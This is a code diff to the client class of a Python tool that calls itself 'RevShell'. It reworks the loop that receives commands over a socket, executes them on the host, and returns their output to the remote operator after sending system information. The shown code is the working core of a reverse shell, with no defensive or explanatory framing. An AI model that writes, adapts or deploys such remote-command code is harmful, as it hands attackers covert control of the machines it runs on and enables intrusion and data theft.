@@ -70,20 +70,29 @@ class Client(StreamSocket):
             sysinfo = self.sys_info()
             self.send(sock, sysinfo)
 
+            # TODO: fix issue => exception is thrown when running outside of pycharm
+
             while True:
                 command = self.receive(sock).decode()
 
-                if command.lower() in ["exit", "quit"]:
-                    self.send(sock, "Connection will now terminate")
+                if command.lower() not in ["exit", "quit"]:
+                    stdout, stderr = self.execute(command, executable)
+
+                    if stdout != b"":
+                        output = stdout
+                        level = "info"
+                    else:
+                        output = stderr
+                        level = "error"
+                    if self.Verbose:
+                        utils.status(bytes(output).decode(), level, command)
+
+                    self.send(sock, output)
+                else:
+                    if self.Verbose:
+                        utils.status(f"Connection been terminated by {self.Address}")
+                        utils.status("Exiting RevShell.")
                     break
-
-                #stdout, stderr = shell.communicate(command.split(), timeout=60)
-                output, level = self.execute(command, executable)
-
-                if self.Verbose:
-                    utils.status(output.decode(), level, command)
-
-                self.send(sock, output)
         except Exception as exc:
             self.except_handler(exc)
         finally:
